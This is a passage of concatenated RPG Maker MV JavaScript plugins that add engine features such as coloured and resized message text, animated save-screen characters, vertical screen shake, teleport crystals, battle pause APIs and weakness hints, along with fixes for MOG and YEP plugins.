new cfc(Window_BattleItem.prototype).add('includes',function f(item){
	return item && item[f.tbl[0]] || f.ori.apply(this,arguments);
},t);

})();


﻿"use strict";
/*:
 * @plugindesc 符合美術ㄉ文字調色，以指定色碼來變色
 * @author agold404
 * @help \TXTCOLOR"CSS顏色"
 * 
 * This plugin can be renamed as you want.
 */

(()=>{ let k,r,t;

new cfc(Bitmap.prototype).add('initialize',function f(){
	const rtv=f.ori.apply(this,arguments);
	this._bak_outlineColor=this.outlineColor;
	return rtv;
});

new cfc(Window_Base.prototype).add('processEscapeCharacter',function f(code,textState){
	return (code===f.tbl[0])?this.changeTextColor(this.processCStyleStringContent(textState)):f.ori.apply(this,arguments);
},[
"TXTCOLOR",
]).add('changeTextColor',function f(color){
	let changed=false;
	if(color&&color.constructor===String){ const m=color.match(f.tbl[0]); if(m){
		let alpha;
		{
			const m=this.contents._bak_outlineColor.match(f.tbl[0]);
			if(m) alpha=Number(m[1]); 
		}
		alpha*=m[1];
		if(isNaN(alpha)) alpha=f.tbl[1];
		this.contents.outlineColor=f.tbl[2][0]+alpha+f.tbl[2][1];
		changed=true;
	} }
	if(!changed) this.contents.outlineColor=this.contents._bak_outlineColor;
	return f.ori.apply(this,arguments);
},[
/rgba[ \t]*\([^,]+,[^,]+,[^,]+,([^)]+)\)/,
0.5,
['rgba(0,0,0,',')'],
]);

})();


﻿"use strict";
/*:
 * @plugindesc 存檔人物會動
 * @author agold404
 * @help .
 * 
 * This plugin can be renamed as you want.
 */

(()=>{ let k,r,t;

new cfc(Window_Base.prototype).add('drawCharacter',function f(characterName,characterIndex,x,y,patternIdx){
	if(isNaN(patternIdx)) patternIdx=1;
	const bmp=ImageManager.loadCharacter(characterName);
	const isBig=ImageManager.isBigCharacter(characterName);
	const n=characterIndex;
	const pw=bmp.width/(isBig?3:12),sx=((n&3)*3+patternIdx)*pw; // n===0 if isBig
	const ph=bmp.height/(isBig?4:8),sy=(n>>2<<2)*ph;
	this.contents.blt(bmp,sx,sy,pw,ph,x-pw/2,y-ph);
});

t=[
0,1,2,1,
3, // 4: msk
12, // 5: $gamePlayer.animationWait
];

new cfc(Window_SavefileList.prototype).add('drawPartyCharacters',function f(info,x,y){
	const arr=info.characters;
	const sz=arr&&arr.length;
	if(0<sz){
		const cpi=this.chrPatternIdx_get();
		for(let i=0;i!==sz;++i){
			const data=arr[i];
			this.drawCharacter(data[0],data[1],x+i*48,y,cpi);
		}
	}
},undefined,true,true).add('select',function f(idx){
	if(this._index!==idx){
		this.chrPatternIdx_reset();
		this.chrPatternIdx_redraw();
	}
	return f.ori.apply(this,arguments);
},undefined).add('chrPatternIdx_reset',function f(){
	this._chrPatternIdx=1;
	this._chrPatternIdxAniCnt=0;
},undefined,true,true).add('chrPatternIdx_next',function f(){
	if(++this._chrPatternIdxAniCnt<f.tbl[5]) return;
	this._chrPatternIdxAniCnt=0;
	++this._chrPatternIdx;
	this._chrPatternIdx&=f.tbl[4];
	this.chrPatternIdx_redraw();
},t,true,true).add('chrPatternIdx_get',function f(){
	return f.tbl[this._chrPatternIdx&f.tbl[4]];
},t,true,true).add('chrPatternIdx_redraw',function f(){
	if(this._index>=0 && this._index<this.maxItems()) this.redrawItem(this._index);
},undefined,true,true).add('update',function f(){
	const rtv=f.ori.apply(this,arguments);
	this.chrPatternIdx_next();
	return rtv;
});

})();


﻿"use strict";
/*:
 * @plugindesc 上下搖
 * @author agold404
 * @help $gameScreen.startShakeY(power,speed,dur);
 * 
 * This plugin can be renamed as you want.
 */

(()=>{ let k,r,t;

new cfc(Game_Screen.prototype).add('clearShake',function f(){
	const rtv=f.ori.apply(this,arguments);
	this.clearShakeY();
	return rtv;
}).add('clearShakeY',function f(){
	this._shakePowerY=0;
	this._shakeSpeedY=0;
	this._shakeDurationY=0;
	this._shakeDirectionY=1;
	this._shakeY=0;
}).add('startShakeY',function f(power,speed,duration){
	this._shakePowerY=power;
	this._shakeSpeedY=speed;
	this._shakeDurationY=duration;
}).add('updateShake',function f(){
	const rtv=f.ori.apply(this,arguments);
	this.updateShakeY();
	return rtv;
}).add('updateShakeY',function f(){
	if(this._shakeDurationY>0||this._shakeY!==0){
		const delta=(this._shakePowerY*this._shakeSpeedY*this._shakeDirectionY)/10;
		if(this._shakeDurationY<=1 && this._shakeY*(this._shakeY+delta)<0) this._shakeY = 0;
		else this._shakeY+=delta;
		if(this._shakeY>this._shakePowerY*2) this._shakeDirectionY=-1;
		if(this._shakeY<-this._shakePowerY*2) this._shakeDirectionY=1;
		--this._shakeDurationY;
	}
}).add('shakeY',function f(){
	if(!(f.tbl[0] in this)) this.clearShake();
	return this._shakeY;
},[
'_shakeY',
]);

new cfc(Spriteset_Base.prototype).add('updatePosition',function f(){
	const rtv=f.ori.apply(this,arguments);
	const screen=$gameScreen;
	this.updatePosition_deltaY(screen);
	return rtv;
}).add('updatePosition_deltaY',function f(screen){
	this.y+=Math.round(screen.shakeY());
});

})();


﻿"use strict";
/*:
 * @plugindesc 地圖note放禁止從選單開存檔頁面
 * @author agold404
 * @help <disableOpenSavemenuFromMenu>
 * 
 * This plugin can be renamed as you want.
 */

(()=>{ let k,r,t;

new cfc(Game_System.prototype).add('isSaveEnabled',function f(){
	return !($dataMap&&$dataMap.meta&&$dataMap.meta.disableOpenSavemenuFromMenu) && f.ori.apply(this,arguments);
});

})();


﻿"use strict";
/*:
 * @plugindesc 直接指定文字大小
 * @author agold404
 * @help \TXTFONTSIZE"數字" 單位是px
 * 
 * This plugin can be renamed as you want.
 */

(()=>{ let k,r,t;

new cfc(Bitmap.prototype).add('initialize',function f(){
	const rtv=f.ori.apply(this,arguments);
	this._bak_outlineColor=this.outlineColor;
	return rtv;
});

t=[
"TXTFONTSIZE",
];

new cfc(Window_Base.prototype).add('processEscapeCharacter',function f(code,textState){
	return (code===f.tbl[0])?this.changeFontSize(this.processCStyleStringContent(textState)):f.ori.apply(this,arguments);
},t).add('changeFontSize',function f(fontSizeNum){
	// currently 'fontSizeNum' only supports 'Number'
	fontSizeNum-=0; 
	if(isNaN(fontSizeNum)) this.contents.fontSize=this.standardFontSize();
	else this.contents.fontSize=fontSizeNum;
	return f.ori&&f.ori.apply(this,arguments);
},t);

})();


﻿"use strict";
/*:
 * @plugindesc 暫時停止中斷戰鬥的逃跑音效1次。連續使用還是只有將來1次。重新進入戰鬥時清除上次設定。
 * @author agold404
 * @help BattleManager.disableAbortEscapeSoundOnce();
 * 
 * This plugin can be renamed as you want.
 */

(()=>{ let k,r,t;

new cfc(Game_System.prototype).add('disableAbortEscapeSound_get',function f(){
	return this._disableAbortEscapeSound;
}).add('disableAbortEscapeSound_set',function f(rhs){
	return this._disableAbortEscapeSound=rhs;
});

new cfc(BattleManager).add('disableAbortEscapeSoundOnce',function f(){
	this._disableAbortEscapeSoundOnce=true;
}).add('checkAbort',function f(){
	if($gameParty.isEmpty()||this.isAborting()){
		this.playAbortEscapeSound();
		this._escaped=true;
		this.processAbort();
	}
	return false;
},undefined,true,true).add('startBattle',function f(){
	this._disableAbortEscapeSoundOnce=false;
	return f.ori.apply(this,arguments);
}).add('playAbortEscapeSound',function f(){
	if(this._disableAbortEscapeSoundOnce || ($gameSystem&&$gameSystem.disableAbortEscapeSound_get())) return this._disableAbortEscapeSoundOnce=false;
	SoundManager.playEscape();
},undefined,true,true);

})();


﻿"use strict";
/*:
 * @plugindesc 修正 MOG_BattleHud update_(h|m)p 在 mhp,mmp 變多時，底層那條不會更新ㄉ問題
 * @author agold404
 * @help .
 * 
 * This plugin can be renamed as you want.
 */

if('undefined'!==typeof Battle_Hud)(()=>{ let k,r,t;

t=[
160,
30,
];

new cfc(Battle_Hud.prototype).add('_update__p',function f(btlr,typeId,spriteFront,spriteBack,flow,oldAni,updateMeterStep,numSprite,updateNumberStep,maxNumSprite,imgData,maxImgData){
	//curr,max,old,oldNum,oldMaxNum = (f.tbl[typeId][:])
	const keys=f.tbl[typeId]; if(!keys) return;
	const currVal=btlr[keys.curr];
	let maxVal;
	if(spriteFront){
		if(flow[0]){
			if(maxVal===undefined) maxVal=btlr[keys.max];
			this.refresh_meter_flow(spriteFront,currVal,maxVal,0,flow[1]);
			const dif_meter=this.update_dif(oldAni[0],currVal,updateMeterStep);
			if(oldAni[0]!==dif_meter){
				oldAni[0]=dif_meter;
				this.refresh_meter_flow(spriteBack,oldAni[0],maxVal,1,flow[1]);
			}
			flow[1]+=1.5;
			if(!(flow[1]<=flow[3])) flow[1]=0;
		}else{
			let refreshed=false;
			if(this.need_refresh_parameter(typeId)){
				refreshed=true;
				if(maxVal===undefined) maxVal=btlr[keys.max];
				this.refresh_meter(spriteFront,currVal,maxVal,0);
				const arr=this[keys.old];
				if(arr){ arr[0]=currVal; arr[1]=maxVal; }
				else this[keys.old]=[currVal,maxVal];
			}
			const dif_meter=this.update_dif(oldAni[0],currVal,updateMeterStep);
			if(refreshed||oldAni[0]!==dif_meter){
				oldAni[0]=dif_meter;
				if(maxVal===undefined) maxVal=btlr[keys.max];
				this.refresh_meter(spriteBack,oldAni[0],maxVal,1);
			}
		}
	}
	if(numSprite){
		let oldNum=this[keys.oldNum];
		const dif_number=this.update_dif(oldNum,currVal,updateNumberStep);
		if (oldNum!==dif_number){
			oldNum=this[keys.oldNum]=dif_number;
			this.refresh_number(numSprite,oldNum,imgData,imgData[4],imgData[5],typeId);
		}
	}
	if(maxNumSprite){
		let oldMaxNum=this[keys.oldMaxNum];
		if(maxVal===undefined) maxVal=btlr[keys.max];
		if(oldMaxNum!==maxVal){
			oldMaxNum=this[keys.oldMaxNum]=maxVal;
			this.refresh_number(maxNumSprite,oldMaxNum,maxImgData,maxImgData[4],maxImgData[5],typeId);
		}
	}
},[
{curr:'hp',max:'mhp',old:'_hp_old',oldNum:'_hp_number_old',oldMaxNum:'_maxhp_number_old',}, // hp
{curr:'mp',max:'mmp',old:'_mp_old',oldNum:'_mp_number_old',oldMaxNum:'_maxmp_number_old',}, // mp
],true,true).add('update_hp',function f(){
	return this._update__p(this._battler,0,this._hp_meter_blue,this._hp_meter_red,this._hp_flow,this._hp_old_ani,f.tbl[0],this._hp_number,f.tbl[1],this._maxhp_number,this._hp_img_data,this._maxhp_img_data);
},t,true,true).add('update_mp',function f(){
	return this._update__p(this._battler,1,this._mp_meter_blue,this._mp_meter_red,this._mp_flow,this._mp_old_ani,f.tbl[0],this._mp_number,f.tbl[1],this._maxmp_number,this._mp_img_data,this._maxhp_img_data);
},t,true,true);

})();


﻿"use strict";
/*:
 * @plugindesc set event data page's 'trigger' to null
 * @author agold404
 * @help use @NULLTRIGGER
 * 
 * This plugin can be renamed as you want.
 */

(()=>{ let k,r,t;

new cfc(DataManager).add('onLoad_after_map',function f(obj){
	const rtv=f.ori.apply(this,arguments);
	this.onLoad_after_map_setNullTriggers(obj);
	return rtv;
}).add('onLoad_after_map_setNullTriggers',function f(obj){
	obj.events.forEach(f.tbl[0]);
},t=[
evtd=>{ if(!evtd) return;
	for(let p=0,pgv=evtd.pages,pe=pgv.length;p!==pe;++p){
		for(let c=0,cmdv=pgv[p].list,ce=cmdv.length;c!==ce;++c){
			if(cmdv[c].code===108 && cmdv[c].parameters[0]==="@NULLTRIGGER"){
				pgv[p].trigger=null;
				break;
			}
		}
	}
},
]);

})();


﻿"use strict";
/*:
 * @plugindesc 謝謝MOG對我造成的傷害
 * @author agold404
 * @help .
 * 
 * This plugin can be renamed as you want.
 */

(()=>{ let k,r,t;

if((typeof Imported!=='undefined')&&Imported.MOG_Picture_Command){
Window_TitleCommand.prototype.updatePlacement=function(){
	this.x=-Graphics.boxWidth;
	this.y=-Graphics.boxHeight;
	this.visible=false;
};
new cfc(Scene_Title.prototype).add('updateComInput',function f(){
	this._csel=false;
	return f.ori.apply(this,arguments);
});
}

})();


﻿"use strict";
/*:
 * @plugindesc 存檔隊員全部都畫啊，不然要幹嘛
 * @author agold404
 * @help .
 * 
 * This plugin can be renamed as you want.
 */

(()=>{ let k,r,t;

new cfc(DataManager).add('makeSavefileInfo',function f(){
	$gameParty._maxBattleMembers_useAll=true;
	const rtv=f.ori.apply(this,arguments);
	$gameParty._maxBattleMembers_useAll=undefined;
	return rtv;
});

new cfc(Game_Party.prototype).add('maxBattleMembers',function f(){
	if(this._maxBattleMembers_useAll) return Infinity;
	return f.ori.apply(this,arguments);
});

})();


﻿"use strict";
/*:
 * @plugindesc 螢幕太大或太小則自動縮放
 * @author agold404
 * @help .
 * 
 * This plugin can be renamed as you want.
 */

(()=>{ let k,r,t;

new cfc(Graphics).add('_defaultStretchMode',function f(){
	if(f.ori.apply(this,arguments)) return true;
	const r=Math.min(window.innerWidth/this._width,window.innerHeight/this._height);
	return r<f.tbl[0]||r>=f.tbl[1];
},[
1,
1.5,
]);

})();


﻿"use strict";
/*:
 * @plugindesc ㄏㄏYEPㄏㄏ ( Game_Battler._atbCharging 竟然不會在 BattleManager.startAction 後放下 )
 * @author agold404
 * @help .
 * 
 * This plugin can be renamed as you want.
 */

(()=>{ let k,r,t;

new cfc(BattleManager).add('startAction',function f(){
	const s=this._subject;
	const rtv=f.ori.apply(this,arguments);
	if(s && s.setATBCharging) s.setATBCharging(false);
	return rtv;
});

})();


﻿"use strict";
/*:
 * @plugindesc 傳送水晶
 * @author agold404
 * @help .
 * 
 * This plugin can be renamed as you want.
 */

(()=>{ let k,r,t;

const compressedEventJsonDataBase="N4IglgJiBcAMA0IB2BDAtgUxiEikHsAXLaHRABxQHMMBnGAbVAGN8kIxCw37pQVmhfACcAklDiIBQ4QDUUAG0gwE4YmnErEnDGnlKJq2hgUAzAMoB3TswAWAYVvZcIY2as3b+5ZNfXCdgCMmr60/kHehohhngBMIUbhtrGRWiAAbijCYCgARgoYCYiZ2XkFqb4lOfkY+gCuJLAAvogcwhiC3EgAYmAAHjCEwg3aaNQkoFwFRSB2WdIYwgBy6CQgAIT2wgCetISKLm0dXGwwABwUKITEwkgwgYhzwgti7BgD0ADMLSBKe4wsfAQEiBQIAdm0byQhDSlGemBuvAYsAAui1AcC0mAoTDfHDVojGGiUYg0Ph0hhuu0AI4NJDMbYwT6k8kYABK+DqxBgoD+uKYsyBjUu8IwhOgDGJiHa5AwVzStAA1mByJQajBTIpjIhLChOBqtRgfmSKeZZRgJAAWFkUgAq21lsOyIk423tjugD1cxHIAEEkGBMPdEIRbMJOVQnL4hmAqDRhGldQpFf7A40miSQB9VIy4E0gAA==";

t=[
undefined, // decompressed json string
326, // common event id
];

new cfc(Scene_Boot.prototype).add('start',function f(){
	f.tbl[0]=LZString.decompressFromBase64(compressedEventJsonDataBase);
	return f.ori.apply(this,arguments);
},t);

new cfc(DataManager).add('onLoad_before_map',function f(obj){
	const rtv=f.ori.apply(this,arguments);
	this.onLoad_before_map_putTeleportCrystal(obj);
	return rtv;
}).add('onLoad_before_map_putTeleportCrystal',function f(obj){
	const evtId=obj._teleportCrystalId=obj.events.length;
	const evtd=JSON.parse(f.tbl[0]);
	evtd.id=evtId;
	($dataMap._eventTemplateSet||($dataMap._eventTemplateSet=new Set())).add(evtId);
	evtd.pages[0].list[0].parameters[0]=f.tbl[1];
	obj.events.push(evtd);
},t);

new cfc(Game_Event.prototype).add('setupPage',function f(){
	const s=$dataMap&&$dataMap._eventTemplateSet;
	if(s&&s.has(this._eventId)) return this.clearPageSettings();
	return f.ori.apply(this,arguments);
});

new cfc(Game_Map.prototype).add('_teleportCrystal_getCont',function f(mapId){
	let t=this._teleportCrystals; if(!t) t=this._teleportCrystals={};
	if(mapId===undefined) return t;
	let c=t[mapId]; if(!c) c=t[mapId]=[];
	return c;
}).add('_teleportCrystal_getSerialCont',function f(){
	let t=this._teleportCrystalSerial; if(!t) t=this._teleportCrystalSerial={serial2map:{},serial2pos:{},_data:[]};
	return t;
}).add('teleportCrystal_add',function f(x,y,mapId){
	if(!$dataMap) return;
	const mid=this.mapId();
	if(mapId===undefined) mapId=mid;
	if(!(mapId>=0)) return;
	this._teleportCrystal_serial|=0; ++this._teleportCrystal_serial;
	this._teleportCrystal_getCont(mapId).uniquePush(this._teleportCrystal_serial);
	const sc=this._teleportCrystal_getSerialCont();
	sc.serial2map[this._teleportCrystal_serial]=mapId;
	const pos=sc.serial2pos[this._teleportCrystal_serial]=[x,y];
	sc._data.uniquePush(this._teleportCrystal_serial);
	if(mid===mapId){
		pos.push($gamePlayer.x,$gamePlayer.y,$gamePlayer.direction(),$dataMap.displayName);
		const i=this.cpevt($dataMap._teleportCrystalId,x,y);
		this._events[i]._teleportCrystal_serial=this._teleportCrystal_serial;
		return i;
	}
}).add('teleportCrystal_get',function f(mapId){
	return this._teleportCrystal_getCont(mapId);
}).add('teleportCrystal_del',function f(serial){
	const sc=this._teleportCrystal_getSerialCont();
	const mapId=(serial in sc.serial2map) && sc.serial2map[serial];
	if(!(mapId>=0)) return;
	{
		const xy=sc.serial2pos[serial],evts=this.eventsXy(xy[0],xy[1]);
		for(let x=0,arr=this.eventsXy(xy[0],xy[1]),xs=arr.length;x!==xs;++x){
			if(arr[x]._teleportCrystal_serial===serial){
				arr[x]._opacity=0;
				arr[x].locate(-1,-1);
				break;
			}
		}
	}
	this._teleportCrystal_getCont(mapId).uniquePop(serial);
	delete sc.serial2map[serial];
	delete sc.serial2pos[serial];
	sc._data.uniquePop(serial);
}).add('teleportCrystal_goto',function f(serial){
	const sc=this._teleportCrystal_getSerialCont();
	if(!sc._data.uniqueHas(serial)) return;
	const mapId=sc.serial2map[serial];
	const pos=sc.serial2pos[serial];
	let x,y,d;
	if(pos.length<5){ x=pos[0]; y=pos[1]; d=2; }
	else{ x=pos[2]; y=pos[3]; d=pos[4]; }
	$gamePlayer.reserveTransfer(mapId,x,y,d,1);
}).add('setup',function f(mapId){
	const mapId_ori=this.mapId();
	const isNew=mapId!==mapId_ori;
	const rtv=f.ori.apply(this,arguments);
	if(isNew){
		if($dataMap&&$dataMap._teleportCrystalId>=0){ const s2pos=this._teleportCrystal_getSerialCont().serial2pos; for(let x=0,arr=this.teleportCrystal_get(mapId),xs=arr.length;x!==xs;++x){
			const pos=s2pos[arr[x]];
			this._events[this.cpevt($dataMap._teleportCrystalId,pos[0],pos[1])]._teleportCrystal_serial=arr[x];
		} }
		if(!this.teleportCrystal_get(mapId_ori).length) delete this.teleportCrystal_get()[mapId_ori];
	}
	return rtv;
});

})();


﻿"use strict";
/*:
 * @plugindesc 戰鬥中離API
 * @author agold404
 * @help SceneManager.resumeBattle(); 
 * SceneManager.pauseBattleAndGotoMap();
 * 
 * This plugin can be renamed as you want.
 */

(()=>{ let k,r,t;

if(typeof Moghunter!=='undefined'){
new cfc(Scene_Base.prototype).add('trfilter',function f(){
	const spt=this._spriteTrasition;
	return spt && spt[0] && spt[0].filters && spt[0].filters[0] || f.tbl[0];
},[
{},
],true,true);
//Scene_Base.prototype.updateTRNoise
new cfc(Spriteset_Battle.prototype).add('hideCharacters',function f(){
	return f.ori && f.ori.apply(this,arguments);
});
}

t=[
[Scene_Map, Scene_Battle],
];

new cfc(SceneManager).add('resumeBattle',function f(){
	if(!this.isScene_map()) return;
	const prev=this._scene._prevScene=$gameTemp._prevBattleSc;
	if(!prev || prev.constructor!==f.tbl[0][1]) return;
	prev._fadeSprite.opacity=0;
	this._stack=f.tbl[0].slice();
	this.pop();
	this._resumeBattle_shouldSet_inBattle=true;
},t).add('pauseBattleAndGotoMap',function f(){
	if(!this.isScene_battle()) return;
	const prev=this.push(Scene_Map,true);
	$gameParty._inBattle=false;
	$gameTemp._prevBattleSc=prev;
},t).add('onSceneChange',function f(){
	const rtv=f.ori.apply(this,arguments);
	this.resumeBattle_set_inBattle();
	return rtv;
}).add('resumeBattle_set_inBattle',function f(){
	if(this._resumeBattle_shouldSet_inBattle && this.isScene_battle()){
		this._resumeBattle_shouldSet_inBattle=false;
		$gameParty._inBattle=true;
	}
});

})();


﻿"use strict";
/*:
 * @plugindesc 換臉圖API
 * @author agold404
 * @help Window_Message.separatedFaces_setUsing(); // 開啟功能
 * 內建的會放到 id=0 的 sprite 上，設定 _faceZ=0
 * 
 * This plugin can be renamed as you want.
 */

(()=>{ let k,r,t;

new cfc(Scene_Base.prototype).add('createMessageWindow_merged',function f(){
	const rtv=f.ori.apply(this,arguments);
	this._messageWindow.separatedFaces_setUsing();
	return rtv;
});

new cfc(Window_Message.prototype).add('drawMessageFace',function f(){
	if(this.separatedFaces_isUsing()){
		this.separatedFaces_redrawFace(0,$gameMessage.faceName(),$gameMessage.faceIndex(),0);
		ImageManager.releaseReservation(this._imageReservationId);
	}else return f.ori.apply(this,arguments);
}).add('separatedFaces_isUsing',function f(){
	return this._separatedFaces_spritesMap;
}).add('separatedFaces_setUsing',function f(){
	let cont=this._separatedFaces_spritesMap; if(!cont) cont=this._separatedFaces_spritesMap=new Map();
	return cont;
}).add('separatedFaces_redrawFace',function f(id,faceName,faceIndex,z){
	const m=this.separatedFaces_setUsing();
	if(!faceName) return m.delete(id);
	const width  =Window_Base._faceWidth;
	const height =Window_Base._faceHeight;
	const bitmap = ImageManager.loadFace(faceName);
	const pw = Window_Base._faceWidth;
	const ph = Window_Base._faceHeight;
	const sw = Math.min(width, pw);
	const sh = Math.min(height, ph);
	const dx = Math.floor(Math.max(width - pw, 0) / 2);
	const dy = Math.floor(Math.max(height - ph, 0) / 2);
	const sx = faceIndex % 4 * pw + (pw - sw) / 2;
	const sy = Math.floor(faceIndex / 4) * ph + (ph - sh) / 2;
	const argv=[bitmap, sx, sy, sw, sh, dx, dy, ];
	z=z-0||0;
	let sp=m.get(id); if(!sp){ (sp=new Sprite(new Bitmap(pw,ph)))._facesZ=z; m.set(id,sp); }
	sp.bitmap.clear();
	// sp.bitmap.blt.apply(sp.bitmap,argv); // image not ready
	sp._isBitmapDrawn=false;
	sp._lastDrawFaceArgv=argv;
}).add('update',function f(){
	const rtv=f.ori.apply(this,arguments);
	this.separatedFaces_updateChildren();
	return rtv;
}).add('separatedFaces_updateChildren',function f(){
	const m=this._separatedFaces_spritesMap; if(!m) return;
	let root=this._separatedFaces_spritesRoot; 
	const targetIdx=this.getChildIndex(this._windowContentsSprite); if(!root&&!(targetIdx>=0)) return;
	if(!root) this.addChildAt(root=this._separatedFaces_spritesRoot=new Sprite(),targetIdx,);
	{ const c=root.children; while(c.length) root.removeChildAt(c.length-1); }
	{ const ref=this._windowContentsSprite; root.x=ref.x; root.y=ref.y; }
	const arr=[];
	m.forEach(f.tbl[0].bind(arr));
	arr.sort(f.tbl[1]).forEach(f.tbl[2],root);
},[
function f(v,k){ this.push(v); },
(spA,spB)=>spA._facesZ-spB._facesZ,
function f(sp){ this.addChild(sp); if(!sp._isBitmapDrawn && sp._lastDrawFaceArgv && sp._lastDrawFaceArgv[0] && sp._lastDrawFaceArgv[0].isReady()){ sp._isBitmapDrawn=true; sp.bitmap.blt.apply(sp.bitmap,sp._lastDrawFaceArgv); } },
]).add('terminateMessage',function f(){
	const rtv=f.ori.apply(this,arguments);
	const m=this.separatedFaces_isUsing();
	if(m) m.clear();
	return rtv;
});

})();


﻿"use strict";
/*:
 * @plugindesc 非常不明顯的弱點或抗性提示
 * @author agold404
 * @help .
 * 
 * This plugin can be renamed as you want.
 */

(()=>{ let k,r,t;

new cfc(Game_ActionResult.prototype).add('clear',function f(){
	const rtv=f.ori.apply(this,arguments);
	this.weaknessRate=1;
	return rtv;
});

new cfc(Game_Action.prototype).add('executeDamage',function f(trgt,val){
	trgt.result().weaknessRate=this._weaknessRate;
	return f.ori.apply(this,arguments);
});

{ const p=Sprite_Damage.prototype;
new cfc(p).add('setup',function f(btlr){
	const rtv=f.ori.apply(this,arguments);
	this.setupWeaknessRateEffect(btlr);
	return rtv;
}).add('setupWeaknessRateEffect',function f(btlr){
	this._hintData=undefined;
	const r=this._result || btlr.result();
	if((!r.hpAffected||!(0<r.hpDamage))&&!(0<r.mpDamage)) return;
	const fc=this._flashColor;
	let wr=this._wr=r&&r.weaknessRate;
	if(!fc||!(wr-=0)) return;
	let idx=-1;
	if(wr<1) idx=0;
	if(1<wr) idx=1;
	let isSet=false; if(idx>=0) isSet=this._setupWeaknessRateEffect_mixFlashColor(f.tbl[idx][0],f.tbl[idx][1],f.tbl[idx][2]);
	this._hintData=f.tbl[idx];
	this.addHintWord();
	if(isSet && !this._flashDuration) this._flashDuration=f.tbl[2];
},t=[
[ /* weighted */ [141, 87, 58,168],0.75 , "\\TXTCENTER:\"RESISTED\"", n=>n*4<5, ], // [ /* add */ [  0,255,  0,168],], 
[ /* weighted */ [168,223,255,168],0.5  , "\\TXTCENTER:\"WEAKNESS\"", n=>n>=1.25, ], // [ /* add */ [  0,  0,255,168],], 
64,
undefined, // 3: textWidth info
undefined, // 4: dummyWindow for text width measurement
"%%", // 5: anchor
p.isPlaying, // 6: txt isPlaying
function(){
	if(1<this._duration){
		--this._duration;
		this.position.set(this.x+this._vx,this.y+this._vy);
		this._vx+=this._dvx;
		this._vy+=this._dvy;
	}else this._duration=0;
	this.alpha=this._duration/this._durationMax;
	const p=!this.isPlaying()&&this.parent;
	if(p) p.removeChild(this);
}, // 7: txt update
[[0,0],[-2,-2],0,1.0/16,], // 8: v0_x range, v0_y range, dv_x, dv_y
0.25, // 9: bias rate
]).add('_setupWeaknessRateEffect_mixFlashColor',function f(color,colorRate){
	return this._setupWeaknessRateEffect_mixFlashColor_weighted(color,colorRate);
},undefined,true,true).add('_setupWeaknessRateEffect_mixFlashColor_add',function f(color){
	const fc=this._flashColor;
	const len=Math.min(fc.length,color.length);
	for(let x=0;x!==len;++x) fc[x]+=color[x];
	return true;
}).add('_setupWeaknessRateEffect_mixFlashColor_weighted',function f(color,colorRate){
	if(colorRate===undefined) colorRate=0.5;
	const fc=this._flashColor;
	const len=Math.min(fc.length,color.length);
	for(let x=0;x!==len;++x) fc[x]=fc[x]*(1-colorRate)+color[x]*colorRate;
	return true;
}).add('addHintWord',function f(p){
	if(!this._hintData||(!p&&!this.parent)||!this._hintData[3](this._wr)) return;
	if(!this._hintData._styledTxt) this._hintData._styledTxt="\\TXTCOLOR\"rgba("+this._hintData[0].slice(0,3)+","+f.tbl[5]+")\""+this._hintData[2];
	p=p||this.parent;
	if(!f.tbl[3]){
		f.tbl[3]={};
		f.tbl[4]=new Window_Base(0,0,1,1);
		f.tbl[3]._lh=f.tbl[4].fittingHeight(1);
	}
	if(!(this._hintData[2] in f.tbl[3])) f.tbl[3][this._hintData[2]]=(f.tbl[4].standardPadding()<<1)+(f.tbl[4].textPadding()<<1)+~~(f.tbl[4].textWidth(this._hintData[2])+1);
	
	// not removing old words
	const sp=this._hintWordSp=new Window_Base(0,0,f.tbl[3][this._hintData[2]],f.tbl[3]._lh);
	sp._windowFrameSprite.visible=sp._windowBackSprite.visible=0;
	sp._durationMax=sp._duration=this._duration;
	sp._vx=Math.random()*(f.tbl[8][0][1]-f.tbl[8][0][0])+f.tbl[8][0][0];
	sp._vy=Math.random()*(f.tbl[8][1][1]-f.tbl[8][1][0])+f.tbl[8][1][0];
	sp._dvx=f.tbl[8][2];
	sp._dvy=f.tbl[8][3];
	const r=1-this._wr;
	sp.drawTextEx(this._hintData._styledTxt.replace(f.tbl[5],Math.max(Math.abs(r)+r*f.tbl[9],0)||0),0,0);
	makeDummyWindowProto(sp);
	sp._windowContentsSprite.anchor.set(0.5,0.5);
	sp.position.set(this.x,this.y);
	sp.isPlaying=f.tbl[6];
	sp.update=f.tbl[7];
	p.addChild(sp);
},t);
Object.defineProperty(p,'parent',{
set:function(rhs){
	this._parent=rhs;
	if(rhs) this.addHintWord();
	return this._parent;
},get:function(){
	return this._parent;
},configurable:true,
});
t[-1]=undefined;
}

})();


﻿"use strict";
/*:
 * @plugindesc commonevents as battle before ; as battle end
 * @author agold404
 * @help .
 * 
 * This plugin can be renamed as you want.
 */

(()=>{ let k,r,t;

new cfc(Scene_Boot.prototype).add('start',function f(){
	this.start_asBattleBeforeAndEnd();
	return f.ori.apply(this,arguments);
}).add('start_asBattleBeforeAndEnd',function f(){
	const arr=$dataCommonEvents;
	let bv=arr._asBattleBefore; if(!bv) bv=arr._asBattleBefore=[];
	let ev=arr._asBattleEnd;    if(!ev) ev=arr._asBattleEnd=[];
	arr.forEach(f.tbl[0]);
},[
(dataobj,i,arr)=>{ if(!dataobj) return;
	const bv=arr._asBattleBefore;
	const ev=arr._asBattleEnd;
	for(let ci=0,cmds=dataobj.list,csz=cmds.length;ci!==csz;++ci){
		const cmd=cmds[ci];
		if(cmd.code===108 && cmd.parameters){
			if(cmd.parameters[0]==="@AS_BATTLE_BEFORE") bv.uniquePush(dataobj);
			if(cmd.parameters[0]==="@AS_BATTLE_END") ev.uniquePush(dataobj);
		}
	}
},
]);

t=[
function(dataobj){
	this.setup(dataobj.list);
	while(this.isRunning()) this.update();
},
];

new cfc(BattleManager).add('setup',function f(){
	const rtv=f.ori.apply(this,arguments);
	$dataCommonEvents._asBattleBefore.forEach(f.tbl[0],$gameTroop._interpreter);
	return rtv;
},t).add('updateBattleEnd',function f(){
	const rtv=f.ori.apply(this,arguments);
	$dataCommonEvents._asBattleEnd.forEach(f.tbl[0],$gameTroop._interpreter);
	return rtv;
},t);

})();


﻿"use strict";
/*:
 * @plugindesc 慢慢改變不透明度
 * @author agold404
 * @help .
 * 
 * This plugin can be renamed as you want.
 */

(()=>{ let k,r,t;

new cfc(Game_CharacterBase.prototype).add('update',function f(){
	const rtv=f.ori.apply(this,arguments);
	this.updateOpacity();
	return rtv;
}).add('setOpacity',function f(opacity,dur,from){
	const opacity_ori=this._opacity;
	const rtv=f.ori.apply(this,arguments);
	if((dur|=0) && 0<dur){
		this._opacitySrc=from===undefined?opacity_ori:from;
		this._opacityDst=opacity;
		this._opacityDur=0;
		this._opacityDurDst=dur;
